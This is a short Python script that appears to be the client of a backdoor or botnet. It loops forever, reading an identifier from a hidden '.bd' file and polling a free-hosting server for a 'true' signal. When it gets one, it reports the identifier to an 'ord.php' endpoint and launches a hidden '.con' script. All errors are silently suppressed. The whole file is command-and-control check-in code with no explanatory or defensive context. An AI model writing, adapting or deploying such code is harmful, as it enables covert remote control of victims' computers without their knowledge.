#!/usr/bin/python

import requests
import os


while True:
    try:
        fi = open('.bd', 'r')
        ot = requests.get('https://dedeco.000webhostapp.com/'+fi.read()+'config')
        fi.close()
        os.system('sleep 2')
        if ot.text == 'true':
            f = open('.bd', 'r')
            tx = f.read()+'config'
            requests.get('https://dedeco.000webhostapp.com/ord.php?ip='+tx)
            f.close()
            os.system('python .con')
        
    except:
        pass
    else:
        os.system('sleep 1')
        continue
        
